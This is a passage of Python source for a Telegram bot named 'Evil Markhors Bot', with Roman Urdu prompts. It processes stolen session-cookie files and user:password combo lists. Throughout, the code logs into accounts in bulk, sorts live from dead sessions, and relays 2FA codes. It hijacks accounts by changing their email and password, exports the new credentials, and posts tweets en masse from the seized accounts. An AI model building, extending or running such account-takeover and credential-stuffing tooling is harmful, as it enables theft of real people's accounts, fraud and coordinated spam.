            z.writestr("working/" + os.path.basename(name), out)
        for name, out in dead:
            z.writestr("dead/" + os.path.basename(name), out)
        z.writestr("summary.txt", "working: " + str(len(working)) + "\ndead: " + str(len(dead)))


async def process_split(ip, op, cfg, live, prog):
    field = cfg["field"]
    buckets = cfg["buckets"]
    is_num = field in NUM_FIELDS
    out = {}
    for label, lo, hi, ex in buckets:
        out[label] = []
    unmatched = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            for name in names:
                try:
                    text = zin.read(name).decode("utf-8", "ignore")
                    data, cookies = parse_cookie_file(text)
                    val = field_value(data, field)
                    if live and not val and cookies:
                        async with sem:
                            try:
                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
                            except asyncio.TimeoutError:
                                ld = {}
                        for k, v in ld.items():
                            if v not in ("", None):
                                data[k] = str(v)
                        val = field_value(data, field)
                    if field in BOOL_FIELDS:
                        val = norm_bool(val)
                    elif field == "country":
                        val = norm_country(val)
                    label = bucket_for(val, buckets, is_num)
                    body = build_cookie_file(data, cookies)
                    base = os.path.basename(name) or "account.txt"
                    if label:
                        out[label].append((base, body))
                        prog.ok += 1
                    else:
                        unmatched.append((base, body))
                        prog.fail += 1
                except Exception:
                    logging.exception("split %s", name)
                    prog.fail += 1
                prog.done += 1
                await prog.update()

    def unique(base, used):
        fn = base
        i = 2
        while fn in used:
            stem, ext = os.path.splitext(base)
            fn = stem + "_" + str(i) + ext
            i += 1
        used.add(fn)
        return fn

    summary = ["Split by " + field, ""]
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for label, items in out.items():
            safe = re.sub(r"[^A-Za-z0-9._+-]", "_", label)
            used = set()
            for base, body in items:
                z.writestr("split_" + safe + "/" + unique(base, used), body)
            summary.append(label + ": " + str(len(items)))
        used = set()
        for base, body in unmatched:
            z.writestr("split_unmatched/" + unique(base, used), body)
        summary.append("unmatched: " + str(len(unmatched)))
        z.writestr("summary.txt", "\n".join(summary))


async def run_ulp_batch(uid, lines, prog):
    b = BATCH[uid]
    b["lines"] = lines
    b["results"] = [None] * len(lines)
    prog.total = len(lines)
    sem = asyncio.Semaphore(CONCURRENCY)

    async def one(idx, line):
        try:
            ulp = parse_ulp(line)
            if not ulp:
                b["results"][idx] = {"ok": False, "line": line, "err": "parse"}
                prog.fail += 1
                return
            cl, ok, info = await asyncio.wait_for(ulp_login(ulp), ACC_TIMEOUT)
            if info.get("pending"):
                PEND.setdefault(uid, {})[str(idx)] = {
                    "kind": "login", "client": cl, "flow_token": info["flow_token"],
                    "subtask": info["pending"], "ulp": ulp, "idx": idx,
                }
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "pending": info["pending"]}
                prog.pend += 1
            elif not ok:
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "err": "login_failed"}
                prog.fail += 1
                await cl.aclose()
            else:
                async with sem:
                    r = await finish_account(uid, idx, ulp, cl)
                if r == "email_pending":
                    prog.pend += 1
                else:
                    prog.ok += 1
        except asyncio.TimeoutError:
            b["results"][idx] = {"ok": False, "line": line, "err": "timeout"}
            prog.fail += 1
        except Exception:
            logging.exception("ulp one")
            b["results"][idx] = {"ok": False, "line": line, "err": "exception"}
            prog.fail += 1
        finally:
            prog.done += 1
            save_batch(uid)

    async def heartbeat():
        while prog.done < prog.total:
            await asyncio.sleep(3)
            await prog.update(force=True)

    hb = asyncio.create_task(heartbeat())
    try:
        await asyncio.gather(*(one(i, l) for i, l in enumerate(lines)))
    finally:
        hb.cancel()


def build_zip(path, uid):
    b = BATCH[uid]
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("results.txt", "\n".join(fmt_result(r) for r in b["results"] if r))
        succ = [r for r in b["results"] if r and r.get("ok")]
        lines = []
        for r in succ:
            name = r["details"].get("Username", "")
            mail = r["details"].get("Email", "") or r["ulp"].get("email", "")
            pw = r.get("new_pass") or r["ulp"]["password"]
            lines.append(name + ":" + mail + ":" + pw)
        z.writestr("success.txt", "\n".join(lines))
        z.writestr("failed.txt", "\n".join((r.get("line") or "") for r in b["results"] if r and not r.get("ok")))


# ============================ HANDLERS ============================
async def _send_zip(u, path, filename, caption):
    with open(path, "rb") as f:
        data = f.read()
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        bad = z.testzip()
        if bad:
            raise RuntimeError("zip corrupt: " + str(bad))
    await u.message.reply_document(
        InputFile(io.BytesIO(data), filename=filename),
        caption=caption,
    )


async def start(u, c):
    await u.message.reply_text(
        "Evil Markhors Bot\n\nModes:\n"
        "1) COOKIES: cookie file -> rework\n2) ULP: user:pass -> verify + takeover\n"
        "3) VERIFY: cookie file -> LIVE/DEAD check\n\n"
        "/mode auto|cookies|ulp|verify\n/live on|off\n/takeover on|off\n/newpass <p>\n"
        "/newemail you@gmail.com\n/status\n/diag\n/finalize\n/cancel\n\n"
        "Admin: /split /splitoff /broadcast /countrytest /tweet /delbatches\n\n"
        "Code maange to bot batayega, aap code bhej dena."
    )


async def help_cmd(u, c):
    await u.message.reply_text(
        "ULP: user:pass | email:pass | user:email:pass | ...:2fa\n"
        "Code aane par: username code (har line alag).\n\n"
        "VERIFY: /verify -> zip bhejo\n\n"
        "TWEET: /tweet [country] -> texts bhejo (har message = 1 variant) -> /tweetgo -> zip\n"
        "DELETE: /delbatches -> /delbatch <id>\n\n"
        "Split fields: " + ", ".join(KEYMAP)
    )


async def status_cmd(u, c):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    txt = (
        "Mode: " + g["mode"] + "\nLive: " + ("ON" if g["live"] else "OFF")
        + "\nTakeover: " + ("ON" if g["takeover"] else "OFF")
        + "\nNewPass: " + (g["newpass"] or "(random)")
        + "\nNewEmail: " + (g["newemail"] or "(none)")
        + "\nBatch: " + ("chal raha" if uid in BATCH else "none")
        + " | Pending: " + str(len(PEND.get(uid, {})))
    )
    cfg = SPLIT.get(uid)
    if cfg:
        txt += "\nSPLIT: " + cfg["field"] + " | " + ", ".join(l for l, a, b, d in cfg["buckets"])
    t = TWEET.get(uid)
    if t:
        txt += "\nTWEET: " + t["stage"] + " | variants " + str(len(t["variants"]))
    await u.message.reply_text(txt)


async def diag_cmd(u, c):
    import platform
    import telegram
    await u.message.reply_text(
        "py " + platform.python_version() + " | ptb " + telegram.__version__ + "\n"
        "cwd " + os.getcwd() + "\nstore " + STORE_PATH + "\n"
        "conc " + str(CONCURRENCY) + " live " + str(LIVE_DEFAULT) + "\n"
        "admin " + str(is_admin(u.effective_user.id)) + "\n"
        "batches " + str(list(BATCH.keys()))
    )


async def mode_cmd(u, c):
    a = c.args[0].lower() if c.args else "auto"
    if a not in ("auto", "cookies", "ulp", "verify"):
        a = "auto"
    await set_cfg(u.effective_user.id, mode=a)
    await u.message.reply_text("Mode = " + a)


async def verify_cmd(u, c):
    await set_cfg(u.effective_user.id, mode="verify")
    await u.message.reply_text("Mode = verify\nAb cookie zip bhejo - working/ aur dead/ folders milenge.")


async def live_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    if a in ("on", "1", "yes"):
        new = True
    elif a in ("off", "0", "no"):
        new = False
    else:
        new = not get_live(uid)
    await set_cfg(uid, live=new)
    await u.message.reply_text("Live = " + ("ON" if new else "OFF"))


async def takeover_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    if a in ("on", "1", "yes"):
        new = True
    elif a in ("off", "0", "no"):
        new = False
    else:
        new = not ucfg(uid)["takeover"]
    await set_cfg(uid, takeover=new)
    await u.message.reply_text("Takeover = " + ("ON" if new else "OFF"))


async def newpass_cmd(u, c):
    await set_cfg(u.effective_user.id, newpass=(" ".join(c.args) if c.args else ""))
    await u.message.reply_text("NewPass = " + (ucfg(u.effective_user.id)["newpass"] or "(random)"))


async def newemail_cmd(u, c):
    await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
    await u.message.reply_text("NewEmail = " + (ucfg(u.effective_user.id)["newemail"] or "(none)"))


async def split_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        cfg = SPLIT.get(uid)
        if not cfg:
            await u.message.reply_text(
                "Split set nahi hai.\nFields: " + ", ".join(KEYMAP) + "\n"
                "Misaal: /split followers 0-100,100-500,500-1000,1000+\n"
                "Misaal: /split country PK,IN,US,GB"
            )
        else:
            await u.message.reply_text(
                "Split: " + cfg["field"] + " | " + ", ".join(l for l, a, b, d in cfg["buckets"])
            )
        return
    field = c.args[0].lower()
    if field not in KEYMAP:
        await u.message.reply_text("Ghalat field. Allowed: " + ", ".join(KEYMAP))
        return
    if len(c.args) < 2:
        await u.message.reply_text("Buckets bhi do. Misaal: /split followers 0-100,100-500")
        return
    buckets = parse_buckets(" ".join(c.args[1:]))
    if not buckets:
        await u.message.reply_text("Buckets samajh nahi aaye.")
        return
    SPLIT[uid] = {"field": field, "buckets": buckets}
    await u.message.reply_text(
        "Split set: " + field + " | " + ", ".join(l for l, a, b, d in buckets) + "\nAb zip bhejo."
    )


async def splitoff_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    SPLIT.pop(str(u.effective_user.id), None)
    await u.message.reply_text("Split off.")


async def broadcast_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    text = " ".join(c.args)
    if not text:
        await u.message.reply_text("Text do: /broadcast Hello")
        return
    sent = 0
    fail = 0
    bot = u.get_bot()
    for uid in list(_store.keys()):
        try:
            await bot.send_message(int(uid), text)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await u.message.reply_text("Broadcast: " + str(sent) + " sent, " + str(fail) + " fail")


async def countrytest_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    CTEST.add(str(u.effective_user.id))
    await u.message.reply_text("Ek account ka cookie .txt bhejo - country detect karke bataunga.")


async def country_test(u, doc):
    tmp = tempfile.mkdtemp(prefix="ct_")
    p = os.path.join(tmp, "c.txt")
    try:
        f = await doc.get_file()
        await f.download_to_drive(p)
        with open(p, encoding="utf-8", errors="ignore") as fh:
            data, cookies = parse_cookie_file(fh.read())
        if not cookies:
            await u.message.reply_text("Cookie lines nahi mili.")
            return
        async with httpx.AsyncClient(follow_redirects=True) as client:
            cc = await detect_country(client, cookie_dict(cookies))
        await u.message.reply_text(
            "Country: " + (cc or "(nahi mila)") + "\nusername: " + str(data.get("Username", ""))
        )
    except Exception as e:
        await u.message.reply_text("Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


async def tweet_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    filt = []
    if c.args:
        for a in " ".join(c.args).split(","):
            a = norm_country(a)
            if a:
                filt.append(a.upper() if len(a) == 2 else a)
    TWEET[uid] = {"stage": "content", "variants": [], "media": None, "filter": filt, "tmp": None}
    await u.message.reply_text(
        "Tweet compose.\n"
        "Ab texts bhejo - har message ek variant banega (roman/urdu/english).\n"
        "Photo/video bhi bhej sakte ho.\n"
        + ("Country filter: " + ", ".join(filt) + "\n" if filt else "")
        + "Sab set hone pe /tweetgo bhejo.\n/tweetcancel se band."
    )


async def tweetgo_cmd(u, c):
    uid = str(u.effective_user.id)
    t = TWEET.get(uid)
    if not t:
        await u.message.reply_text("Pehle /tweet chalao.")
        return
    if not t["variants"] and not t["media"]:
        await u.message.reply_text("Kuch text ya media bhejo pehle.")
        return
    t["stage"] = "cookies"
    await u.message.reply_text("Ab cookie zip bhejo - har account se random variant post hoga.")


async def tweetcancel_cmd(u, c):
    TWEET.pop(str(u.effective_user.id), None)
    await u.message.reply_text("Tweet cancel.")


async def delbatches_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not os.path.isdir(DEL_DIR):
        await u.message.reply_text("Koi batch nahi.")
        return
    rows = []
    for fn in sorted(os.listdir(DEL_DIR)):
        if fn.startswith(uid + "_") and fn.endswith(".json"):
            bid = fn[len(uid) + 1:-5]
            try:
                with open(os.path.join(DEL_DIR, fn), encoding="utf-8") as f:
                    n = len(json.load(f))
            except Exception:
                n = 0
            rows.append(bid + " -> " + str(n) + " accounts")
    if not rows:
        await u.message.reply_text("Koi saved batch nahi.")
        return
    await u.message.reply_text("Batches:\n" + "\n".join(rows) + "\n\nDelete: /delbatch <id>")


async def delbatch_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        await u.message.reply_text("Batch id do: /delbatch <id>")
        return
    await del_batch(uid, u, c.args[0].strip())


async def on_media(u, c):
    uid = str(u.effective_user.id)
    t = TWEET.get(uid)
    if not t or t["stage"] not in ("content",):
        return
    msg = u.message
    tgf = None
    kind = ""
    mime = ""
    if msg.photo:
        tgf = msg.photo[-1]
        kind = "image"
        mime = "image/jpeg"
    elif msg.video:
        tgf = msg.video
        kind = "video"
        mime = msg.video.mime_type or "video/mp4"
    elif msg.document:
        d = msg.document
        mt = d.mime_type or ""
        if mt.startswith("image/"):
            kind, mime = "image", mt
        elif mt.startswith("video/"):
            kind, mime = "video", mt
        else:
            return
        tgf = d
    if not tgf:
        return
    tmp = tempfile.mkdtemp(prefix="twm_")
    path = os.path.join(tmp, "media")
    try:
        f = await tgf.get_file()
        await f.download_to_drive(path)
        cat = "tweet_image" if kind == "image" else "tweet_video"
        TWEET[uid]["media"] = {"path": path, "mime": mime, "category": cat}
        TWEET[uid]["tmp"] = tmp
        if msg.caption:
            TWEET[uid]["variants"].append(msg.caption)
        await u.message.reply_text(
            kind + " set" + (", caption variant add hua" if msg.caption else "")
            + ".\nAur text bhejo ya /tweetgo."
        )
    except Exception as e:
        await u.message.reply_text("Media error: " + str(e))


def detect_mode(text, forced):
    if forced in ("cookies", "ulp", "verify"):
        return forced
    n = 0
    for l in text.splitlines():
        if len(l.split("\t")) >= 7:
            n += 1
    return "cookies" if n >= 3 else "ulp"


async def _hard_clear(uid):
    for v in PEND.get(uid, {}).values():
        try:
            await v["client"].aclose()
        except Exception:
            pass
    PEND.pop(uid, None)
    b = BATCH.pop(uid, None)
    if b:
        shutil.rmtree(b["tmp"], ignore_errors=True)
    clear_batch_file(uid)


async def handle_file(u, c, doc):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    msg = await u.message.reply_text("File mili - shuru kar raha hoon...")
    try:
        if uid in BATCH:
            age = time.time() - BATCH[uid].get("started", time.time())
            if age < 60:
                await _edit(msg, "Pehle wala batch chal raha hai. /cancel ya /finalize karo.")
                return
            await u.message.reply_text("Purana batch clear kar raha hoon...")
            await _hard_clear(uid)

        name = (doc.file_name or "").lower()
        is_zip = name.endswith(".zip")
        size = doc.file_size or 0
        tmp = tempfile.mkdtemp(prefix="em_")
        ip = os.path.join(tmp, "in" + (".zip" if is_zip else ".txt"))
        BATCH[uid] = {
            "tmp": tmp, "msg": msg, "mode": "?", "takeover": g["takeover"],
            "newpass": g["newpass"], "newemail": g["newemail"],
            "results": [], "lines": [], "ok": 0, "fail": 0, "started": time.time(),
        }

        for attempt in range(3):
            try:
                await _edit(msg, "Download... (" + str(round(size / 1e6, 1)) + " MB) try " + str(attempt + 1))
                f = await doc.get_file()
                await f.download_to_drive(ip)
                break
            except Exception:
                if attempt == 2:
                    raise
                await asyncio.sleep(2)

        if is_zip:
            with zipfile.ZipFile(ip) as z:
                sample = ""
                for n in z.namelist()[:3]:
                    if n.endswith(".txt"):
                        sample += z.read(n).decode("utf-8", "ignore")
        else:
            with open(ip, encoding="utf-8") as fh:
                sample = fh.read()

        mode = detect_mode(sample, g["mode"])
        BATCH[uid]["mode"] = mode

        if mode in ("cookies", "verify"):
            op = os.path.join(tmp, "out.zip")
            cfg = SPLIT.get(uid)
            if mode == "verify" and is_zip:
                prog = Progress(msg, 0, "VERIFY")
                prog.phase = "Checking"
                await process_verify(ip, op, True, prog)
                await _send_zip(
                    u, op, "evilmarkhors_verify.zip",
                    "Verify done | live " + str(prog.ok) + " | dead " + str(prog.fail)
                    + "\n" + WEBSITE + "\n" + CREDIT,
                )
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            if cfg and is_zip:
                prog = Progress(msg, 0, "SPLIT")
                prog.phase = "Bucket: " + cfg["field"]
                await process_split(ip, op, cfg, g["live"], prog)
                await _send_zip(
                    u, op, "evilmarkhors_split.zip",
                    "Split done | ok " + str(prog.ok) + " | unmatched " + str(prog.fail)
                    + "\n" + WEBSITE + "\n" + CREDIT,
                )
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            if not is_zip:
                async with httpx.AsyncClient(follow_redirects=True) as client:
                    sem = asyncio.Semaphore(1)
                    out = await rework_cookie(sample, client, g["live"], sem)
                with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                    z.writestr("reworked.txt", out)
                await _edit(msg, "1 file rework ho gayi.")
                ok, fail, total = 1, 0, 1
            else:
                prog = Progress(msg, 0, "COOKIES rework")
                prog.phase = "Rework"
                ok, fail, total = await process_cookie_zip(ip, op, g["live"], prog)
            await _send_zip(
                u, op, "evilmarkhors_cookies.zip",
                "Done: " + str(ok) + " ok, " + str(fail) + " fail\n" + WEBSITE + "\n" + CREDIT,
            )
            await _edit(msg, "Complete")
            await _hard_clear(uid)
        else:
            lines = []
            if is_zip:
                with zipfile.ZipFile(ip) as z:
                    for n in z.namelist():
                        if n.lower().endswith(".txt"):
                            for l in z.read(n).decode("utf-8", "ignore").splitlines():
                                if l.strip():
                                    lines.append(l)
            else:
                with open(ip, encoding="utf-8") as fh:
                    for l in fh.read().splitlines():
                        if l.strip():
                            lines.append(l)
            if not lines:
                await _edit(msg, "Koi line nahi mili.")
                await _hard_clear(uid)
                return
            prog = Progress(msg, len(lines), "ULP process")
            prog.phase = "Login + verify"
            await run_ulp_batch(uid, lines, prog)
            await after_batch(uid, u, msg)
    except Exception as e:
        logging.error("handle_file\n%s", traceback.format_exc())
        await _edit(msg, "Error: " + str(e) + "\n/cancel karke dobara try karo.")
        if uid in BATCH and not PEND.get(uid):
            await _hard_clear(uid)


async def after_batch(uid, u, msg):
    b = BATCH.get(uid)
    if not b:
        return
    pend = PEND.get(uid, {})
    if pend:
        rows = []
        for k, v in list(pend.items())[:40]:
            rows.append(b["lines"][int(k)].split(":")[0] + " -> " + v["kind"])
        await _edit(msg, "ok " + str(b["ok"]) + " | fail " + str(b["fail"]) + " | code " + str(len(pend)))
        await u.message.reply_text(
            str(len(pend)) + " account(s) ko code chahiye:\n\n" + "\n".join(rows)
            + "\n\nBhejo: username code (har line alag). Sab ke baad /finalize."
        )
    else:
        await finalize_batch(uid, u)


async def finalize_batch(uid, u):
    b = BATCH.get(uid)
    if not b:
        await u.message.reply_text("Koi batch nahi.")
        return
    op = os.path.join(b["tmp"], "out.zip")
    build_zip(op, uid)
    succ = 0
    for r in b["results"]:
        if r and r.get("ok"):
            succ += 1
    await _send_zip(
        u, op, "evilmarkhors_" + b["mode"] + ".zip",
        "Done | ok " + str(succ) + " | fail " + str(b["fail"])
        + " | pending " + str(len(PEND.get(uid, {}))) + "\n" + WEBSITE + "\n" + CREDIT,
    )
    await _hard_clear(uid)


async def on_text(u, c):
    uid = str(u.effective_user.id)
    t = TWEET.get(uid)
    if t and t["stage"] == "content":
        txt = (u.message.text or "").strip()
        if txt:
            TWEET[uid]["variants"].append(txt)
        await u.message.reply_text(
            "Variant " + str(len(TWEET[uid]["variants"])) + " add hua. Aur bhejo ya /tweetgo."
        )
        return
    if uid not in BATCH or not PEND.get(uid):
        return
    b = BATCH[uid]
    pend = PEND[uid]
    byname = {}
    for k in pend:
        byname[b["lines"][int(k)].split(":")[0].strip().lower()] = k
    pairs = []
    for line in u.message.text.splitlines():
        parts = line.strip().split()
        if not parts:
            continue
        key = parts[0].strip().lower()
        if len(parts) >= 2 and key in byname:
            pairs.append((byname[key], parts[-1]))
        elif len(pend) == 1:
            pairs.append((list(pend.keys())[0], parts[-1]))
    if not pairs:
        await u.message.reply_text("Samajh nahi aaya. Format: username code")
        return
    for key, code in pairs:
        st = pend.get(key)
        if not st:
            continue
        try:
            if st["kind"] == "login":
                r = await resume_login(st, code)
                if r == "more":
                    await u.message.reply_text(st["ulp"]["username"] or st["ulp"]["email"] + ": aur ek code.")
                    continue
                if r == "ok":
                    res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
                    if res == "email_pending":
                        await u.message.reply_text(st["ulp"]["username"] or st["ulp"]["email"] + ": email set, code bhejo.")
                    else:
                        b["ok"] += 1
                        await u.message.reply_text(st["ulp"]["username"] or st["ulp"]["email"] + ": done")
                else:
                    b["results"][st["idx"]] = {"ok": False, "line": b["lines"][st["idx"]], "err": "code_failed"}
                    b["fail"] += 1
                del pend[key]
                save_batch(uid)
            elif st["kind"] == "email":
                ck = dict(st["client"].cookies)
                if await confirm_email(st["client"], ck, code):
                    res = b["results"][st["idx"]]
                    if b["takeover"]:
                        np = b["newpass"] or gen_pass()
                        if await change_pass(st["client"], ck, st["ulp"]["password"], np):
                            res["new_pass"] = np
                    b["ok"] += 1
                    del pend[key]
                    await st["client"].aclose()
                    save_batch(uid)
                else:
                    await u.message.reply_text("Code galat, dobara bhejo.")
        except Exception:
            logging.error("on_text\n%s", traceback.format_exc())
    if not pend:
        await u.message.reply_text("Sab codes mil gaye - finalize.")
        await finalize_batch(uid, u)
    else:
        await u.message.reply_text(str(len(pend)) + " abhi pending. Baaki codes bhejo ya /finalize.")


async def finalize_cmd(u, c):
    await finalize_batch(str(u.effective_user.id), u)


async def cancel_cmd(u, c):
    await _hard_clear(str(u.effective_user.id))
    await u.message.reply_text("Cancel")


async def on_error(u, c):
    logging.error("HANDLER ERROR\n%s", "".join(traceback.format_exception(None, c.error, c.error.__traceback__)))
    try:
        if u and u.effective_message:
            await u.effective_message.reply_text("Error: " + str(c.error))
    except Exception:
        pass


# ============================ MAIN ============================
async def post_init(app):
    load_batches()
    for uid, b in BATCH.items():
        try:
            await app.bot.send_message(int(uid), "Purana batch mila. /finalize ya /cancel.")
        except Exception:
            pass


async def on_doc(u, c):
    doc = u.message.document
    if not doc:
        return
    uid = str(u.effective_user.id)
    if uid in CTEST and (doc.file_name or "").lower().endswith(".txt"):
        CTEST.discard(uid)
        await country_test(u, doc)
        return
    t = TWEET.get(uid)
    if t and t["stage"] == "cookies" and (doc.file_name or "").lower().endswith(".zip"):
        await run_tweet_batch(u, doc)
        return
    await handle_file(u, c, doc)


def main():
    made = bootstrap()
    if made:
        print("Bani files:", ", ".join(made))
    if "--init" in sys.argv:
        return
    load_store()
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    handlers = [
        ("start", start), ("help", help_cmd), ("status", status_cmd), ("diag", diag_cmd),
        ("mode", mode_cmd), ("verify", verify_cmd), ("live", live_cmd), ("takeover", takeover_cmd),
        ("newpass", newpass_cmd), ("newemail", newemail_cmd),
        ("finalize", finalize_cmd), ("cancel", cancel_cmd),
        ("split", split_cmd), ("splitoff", splitoff_cmd), ("broadcast", broadcast_cmd),
        ("countrytest", countrytest_cmd), ("tweet", tweet_cmd), ("tweetgo", tweetgo_cmd),
        ("tweetcancel", tweetcancel_cmd), ("delbatches", delbatches_cmd), ("delbatch", delbatch_cmd),
    ]
    for cmd, fn in handlers:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, on_media))
    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    logging.info("Bot chalu | conc=%s live=%s", CONCURRENCY, LIVE_DEFAULT)
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
